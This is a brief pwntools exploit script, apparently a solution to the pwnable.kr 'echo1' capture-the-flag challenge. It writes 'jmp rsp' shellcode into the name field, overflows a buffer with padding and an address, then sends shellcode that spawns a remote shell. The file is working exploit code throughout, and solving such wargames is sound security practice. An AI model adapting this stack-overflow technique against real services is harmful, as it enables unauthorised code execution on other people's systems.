from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./echo1')

# p = process('./echo1')
p = remote('pwnable.kr', '9010')
pause()

p.sendlineafter(b'name? : ', asm('jmp rsp'))
p.sendlineafter(b'> ', b'1')

id_addr = 0x6020a0
payload = b'a' * 0x28 + p64(id_addr) + asm(shellcraft.sh())
p.sendlineafter(b'\n', payload)

p.interactive()